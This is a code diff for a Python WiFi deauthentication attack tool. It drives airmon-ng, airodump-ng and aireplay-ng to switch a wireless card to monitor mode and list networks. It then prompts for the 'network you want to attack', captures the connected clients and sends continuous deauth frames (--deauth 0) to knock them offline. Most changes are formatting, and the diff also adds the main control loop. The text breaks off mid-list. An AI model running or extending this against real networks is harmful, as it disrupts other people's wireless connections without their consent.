@@ -80,29 +80,36 @@ def wifiNetworkMenu():
             time.sleep(1)
     except KeyboardInterrupt:
         print("\n Ready To Make Choice")
-    
+
     while True:
         try:
-            choice = int(input("Enter the number of the network you want to attack: "))
+            choice = int(
+                input("Enter the number of the network you want to attack: "))
             if choice > 0 and choice <= len(activeWirelessNetworks):
                 return activeWirelessNetworks[choice - 1]
         except:
             print("Invalid Choice")
-            
+
+
 def setIntoManagedMode(wifiName):
     subprocess.run(["airmon-ng", "stop", wifiName])
     subprocess.run(["ip", "link", "set", wifiName, "down"])
-    #moniter mode
+    # moniter mode
     subprocess.run(["iwconfig", wifiName, "mode", "managed"])
     subprocess.run(["ip", "link", "set", wifiName, "up"])
     subprocess.run(["service", "network-manager", "restart"])
-    
+
+
 def getClients(hackbssid, hackchannel, wifiName):
-    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", "--write-interval", "1", "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
+    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", "--write-interval",
+                     "1", "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
 def deauthAttack(networkMac, targetMac, interface):
-    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", networkMac, "-c", targetMac, interface])
-    
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a",
+                   networkMac, "-c", targetMac, interface])
+
+
 macAddressRegex = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
 wlanCode = re.compile(r"Interface (wlan[0-9])")
 
@@ -113,10 +120,65 @@ macsNotToAttack = []
 
 while True:
     print("Please enter the Mac Address of the network you want to attack")
-    mac = input("Please use comma to seperate the list of more than one macAddress: ")
+    mac = input(
+        "Please use comma to seperate the list of more than one macAddress: ")
     macsNotToAttack = macAddressRegex.findall(mac)
     macsNotToAttack = [mac.upper() for mac in macsNotToAttack]
     if len(macsNotToAttack) > 0:
         break
     print("Invalid Mac Address")
-    
+
+while True:
+    wifiControllerBands = [
+        "bg (2.4 GHz)", "a (5 GHz)", "abg (2.4 GHz and 5 GHz)"]
+    print("Please select the band you want to monitor")
+    for index, controller in enumerate(wifiControllerBands):
+        print(f"{index} - {controller}")
+
+    bandChoice = input("Please select the band you want to monitor: ")
+    try:
+        if wifiControllerBands[int(bandChoice)]:
+            bandChoice = int(bandChoice)
+            break
+    except:
+        print("Invalid Choice")
+
+
+networkControllers = findNic()
+if len(networkControllers) == 0:
+    print("No wireless network controllers found")
+    exit()
+
+while True:
+    for index, controller in enumerate(networkControllers):
+        print(f"{index} - {controller}")
+
+    controllerChoice = input(
+        "Please select the wireless network controller you want to use: ")
+
+    try:
+        if networkControllers[int(controllerChoice)]:
+            controllerChoice = int(controllerChoice)
+            break
+    except:
+        print("Invalid Choice")
+
+wifiName = networkControllers[int(controllerChoice)]
+setMonitorMode(wifiName)
+setBandToMonitor(bandChoice)
+hackBssid = wifiNetworkMenu()["BSSID"]
+hackChannel = wifiNetworkMenu()["channel"]
+
+getClients(hackBssid, hackChannel, wifiName)
+
+actiiveClients = set()
+threadsStarted = []
+
+subprocess.run(["airmon-ng", "start", wifiName, hackChannel])
+try:
+    while True:
+        count = 0
+        subprocess.run("clear", shell=True)
+        for fileName in os.listdir():
+            fieldNames = ["Station MAC", "First time seen", "Last time seen",
+                          ]
